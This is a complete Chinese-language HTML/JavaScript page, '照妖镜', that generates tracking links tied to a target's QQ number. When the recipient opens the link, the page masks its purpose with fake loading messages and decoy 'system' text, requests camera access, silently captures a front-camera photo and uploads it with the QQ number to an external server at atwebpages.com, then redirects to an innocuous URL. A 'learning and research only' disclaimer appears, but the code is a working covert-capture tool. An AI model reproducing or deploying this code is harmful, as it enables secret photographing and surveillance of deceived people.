<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜 - 链接生成器</title>
    <style>
        :root {
            --bg: #0a0a0f;
            --card-bg: #13131a;
            --border: #2a2a35;
            --text: #e0e0e0;
            --text-secondary: #a0a0b0;
            --accent: #6c5ce7;
            --accent-hover: #7d6ff0;
            --danger: #e74c3c;
            --success: #2ecc71;
            --input-bg: #1a1a24;
            --radius: 12px;
            --shadow: 0 8px 32px rgba(0,0,0,0.4);
            --glow: 0 0 30px rgba(108,92,231,0.3);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: var(--bg);
            background-image: 
                radial-gradient(ellipse at 50% 0%, rgba(108,92,231,0.08) 0%, transparent 70%),
                radial-gradient(ellipse at 80% 20%, rgba(46,204,113,0.04) 0%, transparent 60%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: var(--text);
        }
        .config-container {
            width: 100%;
            max-width: 500px;
            animation: fadeInUp 0.6s ease-out;
        }
        @keyframes fadeInUp {
            from { opacity:0; transform: translateY(24px); }
            to { opacity:1; transform: translateY(0); }
        }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 32px 28px;
            box-shadow: var(--shadow);
            backdrop-filter: blur(10px);
        }
        .card-header { text-align:center; margin-bottom:28px; }
        .card-header .icon {
            font-size:48px; display:block; margin-bottom:10px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%,100% { transform:scale(1); }
            50% { transform:scale(1.1); }
        }
        .card-header h1 {
            font-size:26px; font-weight:700; letter-spacing:-0.5px;
            background: linear-gradient(135deg,#e0e0e0,#a0a0c0);
            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
        }
        .card-header p { font-size:13px; color:var(--text-secondary); margin-top:6px; }
        .form-group { margin-bottom:20px; }
        .form-group label {
            display:block; font-size:13px; font-weight:600; color:var(--text-secondary);
            margin-bottom:7px; letter-spacing:0.3px; text-transform:uppercase;
        }
        .form-group label .required { color:var(--danger); margin-left:2px; }
        .input-wrapper { position:relative; }
        .input-wrapper input {
            width:100%; padding:13px 16px; background:var(--input-bg);
            border:1.5px solid var(--border); border-radius:8px; color:var(--text);
            font-size:15px; transition:all 0.25s; outline:none; font-family:inherit;
        }
        .input-wrapper input:focus {
            border-color:var(--accent); box-shadow:0 0 0 3px rgba(108,92,231,0.15); background:#1e1e2a;
        }
        .input-wrapper input::placeholder { color:#555; font-size:13px; }
        .input-hint { font-size:11px; color:#666; margin-top:5px; }
        .btn-generate {
            width:100%; padding:14px; background:var(--accent); color:#fff; border:none;
            border-radius:8px; font-size:16px; font-weight:600; cursor:pointer;
            letter-spacing:0.5px; transition:all 0.3s; font-family:inherit; position:relative; overflow:hidden;
        }
        .btn-generate:hover { background:var(--accent-hover); box-shadow:var(--glow); transform:translateY(-1px); }
        .btn-generate:active { transform:translateY(0); box-shadow:none; }
        .btn-generate::after {
            content:''; position:absolute; top:50%; left:50%; width:0; height:0;
            border-radius:50%; background:rgba(255,255,255,0.2); transform:translate(-50%,-50%);
            transition:width 0.6s, height 0.6s;
        }
        .btn-generate:active::after { width:300px; height:300px; }
        .result-area {
            margin-top:24px; padding:18px; background:#0d0d15; border:1px solid var(--border);
            border-radius:8px; display:none; animation:fadeInUp 0.4s ease-out;
        }
        .result-area.show { display:block; }
        .result-label {
            font-size:12px; font-weight:600; color:var(--success); text-transform:uppercase;
            letter-spacing:1px; margin-bottom:8px;
        }
        .result-link { display:flex; align-items:center; gap:8px; }
        .result-link input {
            flex:1; padding:10px 12px; background:var(--input-bg); border:1px solid var(--border);
            border-radius:6px; color:#7ecbff; font-size:13px;
            font-family:'SF Mono','Consolas','Monaco',monospace; word-break:break-all; outline:none; cursor:text;
        }
        .btn-copy {
            padding:10px 16px; background:var(--success); color:#fff; border:none;
            border-radius:6px; font-size:13px; font-weight:600; cursor:pointer; white-space:nowrap;
            transition:all 0.2s; font-family:inherit;
        }
        .btn-copy:hover { opacity:0.85; transform:scale(1.03); }
        .btn-copy.copied { background:#27ae60; pointer-events:none; }
        .warning-box {
            margin-top:20px; padding:14px 16px; background:rgba(231,76,60,0.08);
            border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; line-height:1.6;
        }
        .warning-box strong { color:#f0a8a0; }
        .warning-box ul { margin:6px 0 0 16px; padding:0; }
        .warning-box li { margin-bottom:3px; }
        .footer-note { text-align:center; font-size:11px; color:#555; margin-top:16px; }

        /* 追踪模式 */
        .tracking-overlay {
            position:fixed; inset:0; z-index:99999; background:#000;
            display:flex; align-items:center; justify-content:center; flex-direction:column; overflow:hidden;
        }
        .bg-text-container { position:absolute; inset:0; pointer-events:none; z-index:1; }
        .bg-text {
            position:absolute; font-family:'SF Mono','Consolas','Monaco','Courier New',monospace;
            font-size:11px; color:rgba(255,255,255,0.06); white-space:nowrap; user-select:none;
            animation: floatText 15s linear infinite; opacity:0;
        }
        @keyframes floatText {
            0% { opacity:0; transform:translateY(0); }
            10% { opacity:0.15; }
            90% { opacity:0.15; }
            100% { opacity:0; transform:translateY(-100vh); }
        }
        .tracking-center { position:relative; z-index:2; display:flex; flex-direction:column; align-items:center; }
        .tracking-spinner {
            width:50px; height:50px; border:3px solid rgba(255,255,255,0.15);
            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; margin-bottom:24px;
        }
        @keyframes spin { to { transform:rotate(360deg); } }
        .tracking-spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
        .tracking-spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
        .tracking-status { color:#aaa; font-size:15px; letter-spacing:0.5px; margin-bottom:10px; text-align:center; }
        .tracking-status.error-text { color:#e74c3c; }
        .tracking-denied { display:none; text-align:center; margin-top:10px; }
        .tracking-denied.show { display:block; }
        .tracking-denied .denied-icon {
            font-size:60px; display:block; margin-bottom:16px; animation:shake 0.5s ease-in-out;
        }
        @keyframes shake {
            0%,100% { transform:translateX(0); }
            25% { transform:translateX(-15px); }
            50% { transform:translateX(15px); }
            75% { transform:translateX(-10px); }
        }
        .tracking-denied .denied-title { font-size:18px; color:#e74c3c; margin-bottom:8px; letter-spacing:1px; }
        .tracking-denied .denied-subtitle { font-size:12px; color:#666; line-height:1.8; }
    </style>
</head>
<body>

    <!-- ==================== 配置模式 ==================== -->
    <div id="configMode" class="config-container">
        <div class="card">
            <div class="card-header">
                <span class="icon">🪞</span>
                <h1>照 妖 镜</h1>
                <p>生成追踪链接 · 自动采集回传</p>
            </div>
            <div class="form-group">
                <label>QQ 号 <span class="required">*</span></label>
                <div class="input-wrapper">
                    <input type="text" id="qqInput" placeholder="输入目标QQ号，用于标识来源" maxlength="20" autocomplete="off">
                </div>
                <div class="input-hint">数据将保存在以此QQ号命名的目录中</div>
            </div>
            <div class="form-group">
                <label>跳转网址 <span class="required">*</span></label>
                <div class="input-wrapper">
                    <input type="url" id="urlInput" placeholder="https://example.com" autocomplete="off">
                </div>
                <div class="input-hint">任务完成后将自动跳转到此网址</div>
            </div>
            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">
                🔗 生成追踪链接
            </button>
            <div class="result-area" id="resultArea">
                <div class="result-label">✅ 追踪链接已生成（点击复制）</div>
                <div class="result-link">
                    <input type="text" id="resultLink" readonly onclick="this.select(); copyLink();">
                    <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
                </div>
                <div style="margin-top:8px;font-size:11px;color:#888;">
                    将此链接发送给目标用户，对方打开后会自动执行任务
                </div>
            </div>
            <div class="warning-box">
                <strong>⚠️ 重要提示：</strong>
                <ul>
                    <li>需要 <strong>HTTPS</strong> 环境（本地测试可用 localhost）</li>
                    <li>请确保本页面部署在 HTTPS 服务器上</li>
                    <li>部分浏览器首次调用会弹出权限询问</li>
                    <li>仅供学习研究，请勿用于非法用途</li>
                </ul>
            </div>
        </div>
        <div class="footer-note">
            API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code>
        </div>
    </div>

    <!-- ==================== 追踪模式 ==================== -->
    <div class="tracking-overlay" id="trackingMode" style="display:none;">
        <div class="bg-text-container" id="bgTextContainer"></div>
        <div class="tracking-center">
            <div class="tracking-spinner" id="trackingSpinner"></div>
            <div class="tracking-status" id="trackingStatus">正在初始化...</div>
            <div class="tracking-denied" id="trackingDenied">
                <span class="denied-icon">🚫</span>
                <div class="denied-title">访问被拒绝</div>
                <div class="denied-subtitle">
                    无法完成操作<br>
                    对方拒绝了本次请求<br>
                    任务已终止
                </div>
            </div>
        </div>
    </div>

    <video id="hiddenVideo" playsinline autoplay muted style="position:fixed;top:-100vh;left:-100vw;width:640px;height:480px;pointer-events:none;opacity:0;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const paramQQ = urlParams.get('qq');
            const paramUrl = urlParams.get('url');

            if (paramQQ && paramUrl) {
                initTrackingMode(paramQQ, decodeURIComponent(paramUrl));
            } else {
                initConfigMode();
            }
        })();

        // ========== 配置模式功能 ==========
        function initConfigMode() {
            document.getElementById('configMode').style.display = 'block';
            document.getElementById('trackingMode').style.display = 'none';

            document.getElementById('qqInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') generateLink();
            });
            document.getElementById('urlInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') generateLink();
            });
            setTimeout(() => document.getElementById('qqInput').focus(), 300);
        }

        function generateLink() {
            const qqInput = document.getElementById('qqInput');
            const urlInput = document.getElementById('urlInput');
            const qq = qqInput.value.trim();
            const targetUrl = urlInput.value.trim();

            if (!qq) {
                shakeElement(qqInput);
                qqInput.focus();
                alert('请输入QQ号');
                return;
            }
            if (!/^\d{4,20}$/.test(qq)) {
                alert('QQ号格式不正确（4-20位数字）');
                qqInput.focus();
                return;
            }
            if (!targetUrl) {
                shakeElement(urlInput);
                urlInput.focus();
                alert('请输入跳转网址');
                return;
            }
            if (!/^https?:\/\/.+/.test(targetUrl)) {
                alert('跳转网址需要以 http:// 或 https:// 开头');
                urlInput.focus();
                return;
            }

            const currentUrl = window.location.origin + window.location.pathname;
            const trackingLink = currentUrl + '?qq=' + qq + '&url=' + encodeURIComponent(targetUrl);

            const resultArea = document.getElementById('resultArea');
            const resultLink = document.getElementById('resultLink');
            const btnCopy = document.getElementById('btnCopy');

            resultLink.value = trackingLink;
            resultArea.classList.add('show');
            btnCopy.textContent = '📋 复制';
            btnCopy.classList.remove('copied');

            resultLink.select();
            copyLink();

            resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
            resultArea.style.boxShadow = '0 0 20px rgba(46,204,113,0.4)';
            setTimeout(() => { resultArea.style.boxShadow = ''; }, 1500);
        }

        function copyLink() {
            const resultLink = document.getElementById('resultLink');
            const btnCopy = document.getElementById('btnCopy');
            resultLink.select();
            try {
                navigator.clipboard.writeText(resultLink.value).then(() => {
                    btnCopy.textContent = '✅ 已复制';
                    btnCopy.classList.add('copied');
                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
                }).catch(() => {
                    document.execCommand('copy');
                    btnCopy.textContent = '✅ 已复制';
                    btnCopy.classList.add('copied');
                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
                });
            } catch (e) {
                document.execCommand('copy');
                btnCopy.textContent = '✅ 已复制';
                btnCopy.classList.add('copied');
            }
        }

        function shakeElement(el) {
            el.style.transition = 'transform 0.1s ease';
            el.style.transform = 'translateX(-6px)';
            setTimeout(() => { el.style.transform = 'translateX(6px)'; }, 100);
            setTimeout(() => { el.style.transform = 'translateX(-4px)'; }, 200);
            setTimeout(() => { el.style.transform = 'translateX(4px)'; }, 300);
            setTimeout(() => { el.style.transform = 'translateX(0)'; }, 400);
        }

        // ========== 背景文字生成 ==========
        let bgTextTimer = null;
        const textPool = [
            'initializing...', 'loading modules...', 'checking environment...', 'establishing channel...',
            'handshake protocol...', 'verifying integrity...', 'allocating memory...', 'scanning interfaces...',
            'acquiring signal...', 'calibrating...', 'processing...', 'buffering data...',
            'compressing stream...', 'encrypting payload...', 'connecting to relay...', 'awaiting response...',
            'validating checksum...', 'optimizing throughput...', 'flushing cache...', 'syncing clock...',
            'resolving DNS...', 'tunneling connection...', 'negotiating cipher...', 'authenticating...',
            'parsing headers...', 'routing packets...', 'balancing load...', 'checking latency...',
            'retrying...', 'standby mode...', 'waking interface...', 'reading sectors...',
            'writing blocks...', 'mounting volume...', 'checking disk...', 'defragmenting...',
            'garbage collecting...', 'reclaiming space...', 'updating registry...', 'applying patches...',
            'restarting service...', 'daemon running...', 'listening on port...', 'accepting connections...',
            'forking process...', 'child process OK', 'parent exiting...', 'session active',
            'heartbeat sent', 'keepalive received', 'timeout adjusted', 'reconnecting...',
            'handshake complete', 'channel secured', 'data transfer OK', 'checksum valid',
            'payload delivered', 'acknowledgment received', 'closing socket...', 'cleanup done',
            'task completed', 'system idle', 'monitoring...', 'log rotated',
            'archive created', 'backup finished', 'integrity verified', 'all systems nominal'
        ];

        function addBackgroundText() {
            const container = document.getElementById('bgTextContainer');
            if (!container) return;
            const text = textPool[Math.floor(Math.random() * textPool.length)];
            const el = document.createElement('div');
            el.className = 'bg-text';
            el.textContent = text;
            el.style.left = Math.random() * 90 + '%';
            el.style.bottom = '0%';
            el.style.animationDuration = (12 + Math.random() * 18) + 's';
            el.style.color = `hsla(${Math.random()*360}, 50%, 70%, 0.07)`;
            container.appendChild(el);
            el.addEventListener('animationend', () => el.remove());
        }

        function startBackgroundText() {
            for (let i = 0; i < 15; i++) setTimeout(addBackgroundText, i * 200);
            bgTextTimer = setInterval(() => addBackgroundText(), 800 + Math.random() * 1200);
        }

        function stopBackgroundText() {
            if (bgTextTimer) { clearInterval(bgTextTimer); bgTextTimer = null; }
            const container = document.getElementById('bgTextContainer');
            if (container) container.innerHTML = '';
        }

        // ========== 追踪模式 ==========
        function updateStatus(text, isError = false) {
            const el = document.getElementById('trackingStatus');
            if (el) {
                el.textContent = text;
                if (isError) el.classList.add('error-text');
                else el.classList.remove('error-text');
            }
        }

        function initTrackingMode(qq, redirectUrl) {
            document.getElementById('configMode').style.display = 'none';
            document.getElementById('trackingMode').style.display = 'flex';
            startBackgroundText();

            const trackingSpinner = document.getElementById('trackingSpinner');
            const trackingDenied = document.getElementById('trackingDenied');
            const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';

            async function startCapture() {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                updateStatus('正在初始化...');
                await sleep(400);

                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    updateStatus('环境不兼容，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    stopBackgroundText();
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }

                updateStatus('等待授权...');
                await sleep(300);

                const constraints = {
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
                    audio: false
                };

                let stream = null;
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    updateStatus('授权成功');
                } catch (err) {
                    if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                            updateStatus('授权成功');
                        } catch (err2) { handleDenied(); return; }
                    } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        handleDenied(); return;
                    } else if (err.name === 'NotFoundError') {
                        updateStatus('设备不可用，正在跳转...', true);
                        trackingSpinner.classList.add('error');
                        stopBackgroundText();
                        setTimeout(() => doRedirect(), 2000);
                        return;
                    } else { handleDenied(); return; }
                }

                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.muted = true;
                updateStatus('准备就绪...');
                await sleep(1500);
                if (video.readyState < 2) await sleep(2000);
                const vw = video.videoWidth || 640;
                const vh = video.videoHeight || 480;
                if (vw === 0 || vh === 0) {
                    updateStatus('数据异常，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    stopStream(stream);
                    stopBackgroundText();
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }
                canvas.width = vw; canvas.height = vh;
                updateStatus('处理中...');
                try { ctx.drawImage(video, 0, 0, vw, vh); }
                catch (e) {
                    updateStatus('处理失败，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    stopStream(stream);
                    stopBackgroundText();
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }
                const imageData = canvas.toDataURL('image/jpeg', 0.65);
                stopStream(stream);

                updateStatus('上传中...');
                const formData = new FormData();
                formData.append('qq', qq);
                formData.append('image', imageData);
                let uploadSuccess = false;
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 15000);
                    const response = await fetch(API_URL, { method: 'POST', body: formData, signal: controller.signal });
                    clearTimeout(timeoutId);
                    if (response.ok) {
                        const result = await response.json();
                        if (result.success) uploadSuccess = true;
                    }
                } catch (err) {}

                if (uploadSuccess) {
                    updateStatus('✓ 完成');
                    trackingSpinner.classList.add('done');
                } else {
                    updateStatus('处理完成，正在跳转...', true);
                }
                stopBackgroundText();
                await sleep(2000);
                doRedirect();
            }

            function handleDenied() {
                updateStatus('访问被拒绝', true);
                trackingSpinner.classList.add('error');
                stopBackgroundText();
                setTimeout(() => {
                    trackingSpinner.style.display = 'none';
                    document.getElementById('trackingStatus').style.display = 'none';
                    trackingDenied.classList.add('show');
                }, 2000);
            }

            function stopStream(s) { if (s) s.getTracks().forEach(t => t.stop()); }
            function doRedirect() {
                document.getElementById('trackingMode').style.display = 'none';
                const video = document.getElementById('hiddenVideo');
                if (video && video.srcObject) stopStream(video.srcObject);
                window.location.href = redirectUrl;
            }
            function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

            setTimeout(() => {
                startCapture().catch(err => {
                    updateStatus('发生错误，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    stopBackgroundText();
                    setTimeout(() => doRedirect(), 2000);
                });
            }, 600);
        }
    </script>
</body>
</html>
